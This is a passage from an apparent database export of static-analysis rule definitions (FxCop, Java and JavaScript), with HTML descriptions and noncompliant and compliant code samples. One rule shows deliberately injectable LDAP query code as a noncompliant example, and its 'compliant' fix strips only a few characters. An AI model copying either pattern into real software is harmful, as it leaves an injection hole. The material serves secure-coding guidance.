\n        // (however, user code cannot be safe critical, so this fix is platform code only).\n        DerivedWithTransparentDefaultCtor() { }\n    }\n\n    public class BaseWithCriticalCtor\n    {\n        [SecurityCritical]\n        public BaseWithCriticalCtor() { }\n    }\n\n    public class DerivedWithSafeCriticalDefaultCtor : BaseWithSafeCriticalDefaultCtor\n    {\n        // CA2132 violation - since the base has a critical default .ctor, the derived must also have a critical \n        // default .ctor.  This is fixed by making this .ctor critical, which is not available to user code\n        [SecuritySafeCritical]\n        public DerivedWithSafeCriticalDefaultCtor() { }\n    }\n}\n</pre>\n\n\n\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/dd983956.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd983956.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806824	1511453806825	1
375	CA2230: Use params for variable arguments	UseParamsForVariableArguments	CA2230	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected type contains a public or protected method that uses the <code>VarArgs</code> calling convention.\n</p>\n<h2>Rule Description</h2>\n<p>\n            The <code>VarArgs</code> calling convention is used with certain method definitions that take a variable number of parameters. A method using the <code>VarArgs</code> calling convention is not Common Language Specification (CLS) compliant and might not be accessible across programming languages.\n            In C#, the <code>VarArgs</code> calling convention is used when a method's parameter list ends with the <code>__arglist</code> keyword. Visual Basic does not support the <code>VarArgs</code> calling convention, and Visual C++  allows its use only in unmanaged code that uses the ellipse <code>...</code> notation.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule in C#, use the params (C# Reference) keyword instead of <code>__arglist</code>.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182366.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182366.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806826	1511453806826	1
376	CA1820: Test for empty strings using string length	TestForEmptyStringsUsingStringLength	CA1820	fxcop	<h2>Cause</h2>\n<p>\n            A string is compared to the empty string by using <code>Object.Equals</code>.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Comparing strings using the <code>String.Length</code> property or the <code>String.IsNullOrEmpty</code> method is significantly faster than using <code>Equals</code>. This is because <code>Equals</code> executes significantly more MSIL instructions than either <code>IsNullOrEmpty</code> or the number of instructions executed to retrieve the <code>Length</code> property value and compare it to zero.\n            You should be aware that <code>Equals</code> and <code>Length</code> == 0 behave differently for null strings. If you try to get the value of the <code>Length</code> property on a null string, the common language runtime throws a <code>System.NullReferenceException</code>. If you perform a comparison between a null string and the empty string, the common language runtime does not throw an exception; the comparison returns <code>false</code>. Testing for null does not significantly affect the relative performance of these two approaches. When targeting .NET Framework 2.0, use the <code>IsNullOrEmpty</code> method. Otherwise, use the <code>Length</code> == comparison whenever possible.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the comparison to use the <code>Length</code> property and test for the null string. If targeting .NET Framework 2.0, use the <code>IsNullOrEmpty</code> method.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if performance is not an issue.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182279.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182279.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	15min	\N	\N	\N	\N	\N	f	HTML	1511453806827	1511453806827	1
377	CA1043: Use integral or string argument for indexers	UseIntegralOrStringArgumentForIndexers	CA1043	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected type contains a public or protected indexer that uses an index type other than System.Int32, System.Int64, <code>System.Object</code>, or <code>System.String</code>.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Indexers, that is, indexed properties, should use integer or string types for the index. These types are typically used for indexing data structures and increase the usability of the library. Use of the <code>Object</code> type should be restricted to those cases where the specific integer or string type cannot be specified at design time. If the design requires other types for the index, reconsider whether the type represents a logical data store. If it does not represent a logical data store, use a method.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the index to an integer or string type, or use a method instead of the indexer.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Suppress a warning from this rule only after carefully considering the need for the nonstandard indexer.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:IndexersShouldNotBeMultidimensional}<br/>\n\n\n\n\n                {rule:fxcop:UsePropertiesWhereAppropriate}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182180.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182180.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806828	1511453806828	1
522	Multiple loops over the same set should be combined	S3047	S3047	squid	<p>\n  When a method loops multiple over the same set of data,\n  whether it's a list or a set of numbers,\n  it is highly likely that the method could be made more efficient by combining\n  the loops into a single set of iterations.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomethingToAList(List&lt;String&gt; strings) {\n  for (String str : strings) {\n    doStep1(str);\n  }\n  for (String str : strings) {  // Noncompliant\n    doStep2(str);\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomethingToAList(List&lt;String&gt; strings) {\n  for (String str : strings) {\n    doStep1(str);\n    doStep2(str);\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	performance	f	HTML	1511453807051	1511453807051	1
523	Values passed to LDAP queries should be sanitized	S2078	S2078	squid	<p>Applications that execute LDAP queries should neutralize any externally-provided values in those commands. Failure to do so could allow an attacker to include input that changes the query so that unintended commands are executed, or sensitive data is exposed. Unhappily LDAP doesn't provide any prepared statement interfaces like SQL to easily remove this risk. So each time a LDAP query is built dynamically this rule logs an issue.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic User lookupUser(String username, String base, String [] requestedAttrs) {\n\n  // ...\n  DirContext dctx = new InitialDirContext(env);\n\n  SearchControls sc = new SearchControls();\n  sc.setReturningAttributes(requestedAttrs);  // Noncompliant\n  sc.setSearchScope(SearchControls.SUBTREE_SCOPE);\n\n  String filter = "(&amp;(objectClass=user)(sAMAccountName=" + username + "))";\n\n  NamingEnumeration results = dctx.search(base,  // Noncompliant\n        filter,  // Noncompliant; parameter concatenated directly into string\n        sc);\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic User lookupUser(String username, String base, String [] requestedAttrs) {\n\n  // ...\n  DirContext dctx = new InitialDirContext(env);\n\n  SearchControls sc = new SearchControls();\n  sc.setReturningAttributes(buildAttrFilter(requestedAttrs));  // Compliant; method presumably scrubs input\n  sc.setSearchScope(SearchControls.SUBTREE_SCOPE);\n  \n  String useBase = "ou=People";\n  if (! base.startsWith(useBase)) {\n    useBase = base;\n  }\n  \n  String filter = "(&amp;(objectClass=user)(sAMAccountName=" + username.replaceAll("[()| ]","") + "))";\n\n  NamingEnumeration results = dctx.search(useBase,  // Compliant; originally value used conditionally\n        filter,  // Compliant; parameter NOT concatenated directly into string\n        sc);\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/90">MITRE CWE-90</a> - Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')</li>\n<li> <a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection">OWASP Top Ten 2013 Category A1</a> - Injection</li>\n<li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#LDAP_INJECTION">Potential LDAP Injection</a></li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	cwe,owasp-a1	f	HTML	1511453807052	1511453807052	3
378	CA2235: Mark all non-serializable fields	MarkAllNonSerializableFields	CA2235	fxcop	<h2>Cause</h2>\n<p>\n            An instance field of a type that is not serializable is declared in a type that is serializable.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A serializable type is one that is marked with the <code>System.SerializableAttribute</code> attribute. When the type is serialized, a <code>System.Runtime.Serialization.SerializationException</code> exception is thrown if a type contains an instance field of a type that is not serializable.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, apply the <code>System.NonSerializedAttribute</code> attribute to the field that is not serializable.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Only suppress a warning from this rule if a <code>System.Runtime.Serialization.ISerializationSurrogate</code> type is declared that allows instances of the field to be serialized and deserialized.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:CallBaseClassMethodsOnISerializableTypes}<br/>\n\n\n\n\n                {rule:fxcop:ImplementISerializableCorrectly}<br/>\n\n\n\n\n                {rule:fxcop:ImplementSerializationConstructors}<br/>\n\n\n\n\n                {rule:fxcop:ImplementSerializationMethodsCorrectly}<br/>\n\n\n\n\n                {rule:fxcop:MarkISerializableTypesWithSerializable}<br/>\n\n\n\n\n                {rule:fxcop:ProvideDeserializationMethodsForOptionalFields}<br/>\n\n\n\n\n                {rule:fxcop:SecureSerializationConstructors}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182349.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182349.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806829	1511453806829	1
379	CA2201: Do not raise reserved exception types	DoNotRaiseReservedExceptionTypes	CA2201	fxcop	<h2>Cause</h2>\n<p>\n            A method raises an exception type that is too general or that is reserved by the runtime.\n</p>\n<h2>Rule Description</h2>\n<p>\n            The following exception types are too general to provide sufficient information to the user:\n            <ul>\n              <li>\n\n\n                    <code>System.Exception</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>System.ApplicationException</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>System.SystemException</code>\n\n\n              </li>\n            </ul>\n            The following exception types are reserved and should be thrown only by the common language runtime:\n            <ul>\n              <li>\n\n\n                    <code>System.ExecutionEngineException</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>System.IndexOutOfRangeException</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>System.NullReferenceException</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>System.OutOfMemoryException</code>\n\n\n              </li>\n            </ul>\n\n              Do Not Throw General Exceptions\n\n            If you throw a general exception type, such as <code>Exception</code> or <code>SystemException</code> in a library or framework, it forces consumers to catch all exceptions, including unknown exceptions that they do not know how to handle.\n            Instead, either throw a more derived type that already exists in the framework, or create your own type that derives from <code>Exception</code>.\n\n              Throw Specific Exceptions\n\n            The following table shows parameters and which exceptions to throw when you validate the parameter, including the value parameter in the set accessor of a property:\n\n\n\n\n\n\n\n                    Parameter Description\n\n\n                    Exception\n\n\n\n\n\n\n                        <code>null</code>\n                       reference \n\n\n\n\n                        <code>System.ArgumentNullException</code>\n\n\n\n\n\n\n                    Outside the allowed range of values (such as an index for a collection or list)\n\n\n\n\n                        <code>System.ArgumentOutOfRangeException</code>\n\n\n\n\n\n\n                    Invalid <code>enum</code> value\n\n\n\n\n                        <code>System.ComponentModel.InvalidEnumArgumentException</code>\n\n\n\n\n\n\n                    Contains a format that does not meet the parameter specifications of a method (such as the format string for ToString(String))\n\n\n\n\n                        <code>System.FormatException</code>\n\n\n\n\n\n\n                    Otherwise invalid\n\n\n\n\n                        <code>System.ArgumentException</code>\n\n\n\n\n\n\n            When an operation is invalid for the current state of an object    throw <code>System.InvalidOperationException</code>\n            When an operation is performed on an object that has been disposed    throw <code>System.ObjectDisposedException</code>\n            When an operation is not supported (such as in an overridden Stream.Write in a Stream opened for reading)    throw <code>System.NotSupportedException</code>\n            When a conversion would result in an overflow (such as in a explicit cast operator overload)    throw <code>System.OverflowException</code>\n            For all other situations, consider creating your own type that derives from <code>Exception</code> and throw that.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the type of the thrown exception to a specific type that is not one of the reserved types.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:DoNotCatchGeneralExceptionTypes}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182338.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182338.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806830	1511453806830	1
829	Braces and parentheses should be used consistently with arrow functions	S3524	\N	javascript	<p>Shared coding conventions allow teams to collaborate effectively. This rule raises an issue when the use of parentheses with an arrow function does not conform to the configured requirements.</p>\n\n<h2>Noncompliant Code Example</h2>\n<p>With the configured defaults forbidding parentheses</p>\n<pre>\nvar foo = (a) =&gt; { /* ... */ };  // Noncompliant; remove parens from arg\nvar bar = (a, b) =&gt; { return 0; };  // Noncompliant; remove curly braces from body\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar foo = a =&gt; { /* ... */ };\nvar bar = (a, b) =&gt; 0;\n</pre>	0	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	convention,es2015	f	HTML	1511453807444	1511453807444	1
830	"continue" should not be used	ContinueStatement	\N	javascript	<p><code>continue</code> is an unstructured control flow statement. It makes code less testable, less readable and less maintainable. Structured control flow statements such as <code>if</code> should be used instead.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\n  for (i = 0; i < 10; i++) {\n    if (i == 5) {\n      continue;  /* Non-Compliant */\n    }\n    alert("i = " + i);\n  }\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\n  for (i = 0; i < 10; i++) {\n    if (i != 5) {  /* Compliant */\n      alert("i = " + i);\n    }\n  }\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> MISRA C:2004, 14.5</li>\n</ul>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	misra	f	HTML	1511453807448	1511453807448	1
831	The identity operator ("===") should not be used with dissimilar types	S3403	\N	javascript	<p>Comparing dissimilar types using the identity operator (<code>===</code>) will always return <code>false</code> because no type conversion is done before the comparison. Thus, such comparisons can only be bugs.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar a = 8;\nvar b = "8";\n\nif (a === b) {  // Noncompliant; always false\n  // ...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar a = 8;\nvar b = "8";\n\nif (a == b) {\n  // ...\n}\n</pre>\n<p>or</p>\n<pre>\nvar a = 8;\nvar b = "8";\n\nif (a === Number(b)) {\n  // ...\n}\n</pre>	3	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807449	1511453807449	2
380	CA2233: Operations should not overflow	OperationsShouldNotOverflow	CA2233	fxcop	<h2>Cause</h2>\n<p>\n            A method performs an arithmetic operation and does not validate the operands beforehand to prevent overflow.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Arithmetic operations should not be performed without first validating the operands to make sure that the result of the operation is not outside the range of possible values for the data types involved. Depending on the execution context and the data types involved, arithmetic overflow can result in either a <code>System.OverflowException</code> or the most significant bits of the result discarded.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, validate the operands before you perform the operation.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if the possible values of the operands will never cause the arithmetic operation to overflow.\n</p>\n<h2>Example of a Violation</h2>\n\n<h3>Description</h3>\n<p>\n                A method in the following example manipulates an integer that violates this rule. Visual Basic requires the Remove integer overflow option to be disabled for this to fire.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\n\nnamespace Samples\n{\n    public static class Calculator\n    {\n        public static int Decrement(int input)\n        {\n            // Violates this rule\n            input--;\n            return input;\n        }\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h3>Comments</h3>\n<p>\n                If the method in this example is passed MinValue, the operation would underflow. This causes the most significant bit of the result to be discarded. The following code shows how this occurs.\n                [C#]\n\n\n\n\n\n\n\n\n\n            <pre>\npublic static void Main()\n{\n    int value = int.MinValue;    // int.MinValue is -2147483648\n    value = Calculator.Decrement(value);\n    Console.WriteLine(value);\n}\n</pre>\n\n\n\n\n[VB]\n\n\n\n\n\n\n\n\n\n            <pre>\nPublic Shared Sub Main()\n    Dim value = Integer.MinValue    ' Integer.MinValue is -2147483648\n    value = Calculator.Decrement(value)\n    Console.WriteLine(value)\nEnd Sub\n</pre>\n\n\n\n\n\n\n\n\n\n\n\n                    Output\n\n\n\n\n\n</p>\n<h2>Fix with Input Parameter Validation</h2>\n\n<h3>Description</h3>\n<p>\n                The following example fixes the previous violation by validating the value of input.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\n\nnamespace Samples\n{\n    public static class Calculator\n    {\n        public static int Decrement(int input)\n        {\n            if (input == int.MinValue)\n                throw new ArgumentOutOfRangeException("input", "input must be greater than Int32.MinValue");\n\n            input--;\n            return input;\n        }\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h2>Fix with a Checked Block</h2>\n\n<h3>Description</h3>\n<p>\n                The following example fixes the previous violation by wrapping the operation in a checked block. If the operation causes an overflow, a <code>System.OverflowException</code> will be thrown.\n                Note that checked blocks are not supported in Visual Basic.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\n\nnamespace Samples\n{\n    public static class Calculator\n    {\n        public static int Decrement(int input)\n        {\n            checked\n            {\n                input--;\n            }\n\n            return input;\n        }\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h2>Turn on Checked Arithmetic Overflow/Underflow</h2>\n<p>\n            If you turn on checked arithmetic overflow/underflow in C#, it is equivalent to wrapping every integer operation in a checked block.\n\n              To turn on checked arithmetic overflow/underflow in C#\n\n\n              <li>\n                In Solution Explorer, right-click your project and choose Properties.\n              </li>\n              <li>\n                Select the Build tab and click Advanced.\n              </li>\n              <li>\n                Select Check for arithmetic overflow/underflow and click OK.\n              </li>\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182354.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182354.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806831	1511453806831	1
381	CA2239: Provide deserialization methods for optional fields	ProvideDeserializationMethodsForOptionalFields	CA2239	fxcop	<h2>Cause</h2>\n<p>\n            A type has a field that is marked with the <code>System.Runtime.Serialization.OptionalFieldAttribute</code> attribute and the type does not provide de-serialization event handling methods.\n</p>\n<h2>Rule Description</h2>\n<p>\n            The <code>OptionalFieldAttribute</code> attribute has no effect on serialization; a field marked with the attribute is serialized. However, the field is ignored on de-serialization and retains the default value associated with its type. De-serialization event handlers should be declared to set the field during the de-serialization process.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, add de-serialization event handling methods to the type.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if the field should be ignored during the de-serialization process.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:CallBaseClassMethodsOnISerializableTypes}<br/>\n\n\n\n\n                {rule:fxcop:ImplementISerializableCorrectly}<br/>\n\n\n\n\n                {rule:fxcop:ImplementSerializationConstructors}<br/>\n\n\n\n\n                {rule:fxcop:ImplementSerializationMethodsCorrectly}<br/>\n\n\n\n\n                {rule:fxcop:MarkAllNonSerializableFields}<br/>\n\n\n\n\n                {rule:fxcop:MarkISerializableTypesWithSerializable}<br/>\n\n\n\n\n                {rule:fxcop:SecureSerializationConstructors}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182362.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182362.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	1h	\N	\N	\N	\N	\N	f	HTML	1511453806832	1511453806833	1
382	CA1700: Do not name enum values 'Reserved'	DoNotNameEnumValuesReserved	CA1700	fxcop	<h2>Cause</h2>\n<p>\n            The name of an enumeration member contains the word "reserved".\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule assumes that an enumeration member that has a name that contains "reserved" is not currently used but is a placeholder to be renamed or removed in a future version. Renaming or removing a member is a breaking change. You should not expect users to ignore a member just because its name contains "reserved", nor can you rely on users to read or abide by documentation. Furthermore, because reserved members appear in object browsers and smart integrated development environments, they can cause confusion about which members are actually being used.\n            Instead of using a reserved member, add a new member to the enumeration in the future version. In most cases the addition of the new member is not a breaking change, as long as the addition does not cause the values of the original members to change.\n\n\n\n            In a limited number of cases the addition of a member is a breaking change even when the original members retain their original values. Primarily, the new member cannot be returned from existing code paths without breaking callers that use a <code>switch</code> (<code>Select</code> in Visual Basic) statement on the return value that encompasses the whole member list and that throw an exception in the default case. A secondary concern is that client code might not handle the change in behavior from reflection methods such as <code>Enum.IsDefined</code>. Accordingly, if the new member has to be returned from existing methods or a known application incompatibility occurs because of poor reflection usage, the only nonbreaking solution is to:\n\n              <li>\n                Add a new enumeration that contains the original and new members.\n              </li>\n              <li>\n                Mark the original enumeration with the <code>System.ObsoleteAttribute</code> attribute.\n              </li>\n\n             Follow the same procedure for any externally visible types or members that expose the original enumeration.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, remove or rename the member.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule for a member that is currently used or for libraries that have previously shipped.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:DoNotMarkEnumsWithFlags}<br/>\n\n\n\n\n                {rule:fxcop:DoNotPrefixEnumValuesWithTypeName}<br/>\n\n\n\n\n                {rule:fxcop:EnumStorageShouldBeInt32}<br/>\n\n\n\n\n                {rule:fxcop:EnumsShouldHaveZeroValue}<br/>\n\n\n\n\n                {rule:fxcop:MarkEnumsWithFlags}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182236.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182236.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806833	1511453806833	1
383	CA2004: Remove calls to GC.KeepAlive	RemoveCallsToGCKeepAlive	CA2004	fxcop	<h2>Cause</h2>\n<p>\n            Classes use <code>SafeHandle</code> but still contain calls to <code>GC.KeepAlive</code>.\n</p>\n<h2>Rule Description</h2>\n<p>\n            If you are converting to <code>SafeHandle</code> usage, remove all calls to <code>GC.KeepAlive </code>(object). In this case, classes should not have to call <code>GC.KeepAlive</code>,<code> </code>assuming they do not have a finalizer but rely on <code>SafeHandle</code> to complete the OS handle for them.  Although the cost of leaving in a call to <code>GC.KeepAlive</code> might be negligible as measured by performance, the perception that a call to <code>GC.KeepAlive</code> is either necessary or sufficient to solve a lifetime issue that might no longer exist makes the code harder to maintain.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Remove calls to <code>GC.KeepAlive</code>.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            You can suppress this warning only if it is not technically correct to convert to <code>SafeHandle</code> usage in your class.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182293.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182293.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806835	1511453806835	1
384	CA1060: Move P/Invokes to NativeMethods class	MovePInvokesToNativeMethodsClass	CA1060	fxcop	<h2>Cause</h2>\n<p>\n            A method uses Platform Invocation Services to access unmanaged code and is not a member of one of the NativeMethods classes.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Platform Invocation methods, such as those that are marked by using the <code>System.Runtime.InteropServices.DllImportAttribute</code> attribute, or methods that are defined by using the <code>Declare</code> keyword in Visual Basic, access unmanaged code. These methods should be in one of the following classes:\n            <ul>\n              <li>\n\n                  NativeMethods - This class does not suppress stack walks for unmanaged code permission. (<code>System.Security.SuppressUnmanagedCodeSecurityAttribute</code> must not be applied to this class.) This class is for methods that can be used anywhere because a stack walk will be performed.\n              </li>\n              <li>\n\n                  SafeNativeMethods - This class suppresses stack walks for unmanaged code permission. (<code>System.Security.SuppressUnmanagedCodeSecurityAttribute</code> is applied to this class.) This class is for methods that are safe for anyone to call. Callers of these methods are not required to perform a full security review to make sure that the usage is secure because the methods are harmless for any caller.\n              </li>\n              <li>\n\n                  UnsafeNativeMethods - This class suppresses stack walks for unmanaged code permission. (<code>System.Security.SuppressUnmanagedCodeSecurityAttribute</code> is applied to this class.) This class is for methods that are potentially dangerous. Any caller of these methods must perform a full security review to make sure that the usage is secure because no stack walk will be performed.\n              </li>\n            </ul>\n            These classes are declared as <code>internal</code> (<code>Friend</code>, in Visual Basic) and declare a private constructor to prevent new instances from being created. The methods in these classes should be <code>static</code> and <code>internal</code> (<code>Shared</code> and <code>Friend</code> in Visual Basic).\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, move the method to the appropriate NativeMethods class. For most applications, moving P/Invokes to a new class that is named NativeMethods is enough.\n            However, if you are developing libraries for use in other applications, you should consider defining two other classes that are called SafeNativeMethods and UnsafeNativeMethods. These classes resemble the NativeMethods class; however, they are marked by using a special attribute called SuppressUnmanagedCodeSecurityAttribute. When this attribute is applied, the runtime does not perform a full stack walk to make sure that all callers have the UnmanagedCode permission. The runtime ordinarily checks for this permission at startup. Because the check is not performed, it can greatly improve performance for calls to these unmanaged methods, It also enables code that has limited permissions to call these methods.\n            However, you should use this attribute with great care. It can have serious security implications if it is implemented incorrectly..\n            For information about how to implement the methods, see the NativeMethods Example, SafeNativeMethods Example, and UnsafeNativeMethods Example.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Example</h2>\n\n<h3>Description</h3>\n<p>\n                Because the NativeMethods class should not be marked by using SuppressUnmanagedCodeSecurityAttribute, P/Invokes that are put in it will require UnmanagedCode permission. Because most applications run from the local computer and run together with full trust, this is usually not a problem. However, if you are developing reusable libraries, you should consider defining a SafeNativeMethods or UnsafeNativeMethods class.\n                The following example shows an Interaction.Beep method that wraps the MessageBeep function from user32.dll. The MessageBeep P/Invoke is put in the NativeMethods class.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\nusing System.Runtime.InteropServices;\nusing System.ComponentModel;\n\npublic static class Interaction\n{\n    // Callers require Unmanaged permission         \n    public static void Beep()\n    {\n        // No need to demand a permission as callers of Interaction.Beep             \n        // will require UnmanagedCode permission             \n        if (!NativeMethods.MessageBeep(-1))\n            throw new Win32Exception();\n    }\n}\n\ninternal static class NativeMethods\n{\n    [DllImport("user32.dll", CharSet = CharSet.Auto)]\n    [return: MarshalAs(UnmanagedType.Bool)]\n    internal static extern bool MessageBeep(int uType);\n}\n</pre>\n\n\n\n\n\n</p>\n<h2>SafeNativeMethods Example</h2>\n\n<h3>Description</h3>\n<p>\n                P/Invoke methods that can be safely exposed to any application and that do not have any side effects should be put in a class that is named SafeNativeMethods. You do not have to demand permissions and you do not have to pay much attention to where they are called from.\n                The following example shows an Environment.TickCount property that wraps the GetTickCount function from kernel32.dll.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\nusing System.Runtime.InteropServices;\nusing System.Security;\n\npublic static class Environment\n{\n    // Callers do not require UnmanagedCode permission        \n    public static int TickCount\n    {\n        get\n        {\n            // No need to demand a permission in place of                \n            // UnmanagedCode as GetTickCount is considered               \n            // a safe method               \n            return SafeNativeMethods.GetTickCount();\n        }\n    }\n}\n\n[SuppressUnmanagedCodeSecurityAttribute]\ninternal static class SafeNativeMethods\n{\n    [DllImport("kernel32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]\n    internal static extern int GetTickCount();\n}\n</pre>\n\n\n\n\n\n</p>\n<h2>UnsafeNativeMethods Example</h2>\n\n<h3>Description</h3>\n<p>\n                P/Invoke methods that cannot be safely called and that could cause side effects should be put in a class that is named UnsafeNativeMethods. These methods should be rigorously checked to make sure that they are not exposed to the user unintentionally. The rule {rule:fxcop:ReviewSuppressUnmanagedCodeSecurityUsage} can help with this. Alternatively, the methods should have another permission that is demanded instead of UnmanagedCode when they use them.\n                The following example shows a Cursor.Hide method that wraps the ShowCursor function from user32.dll.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\nusing System.Runtime.InteropServices;\nusing System.Security;\nusing System.Security.Permissions;\n\npublic static class Cursor\n{\n    // Callers do not require UnmanagedCode permission, however,        \n    // they do require UIPermissionWindow.AllWindows        \n    public static void Hide()\n    {\n        // Need to demand an 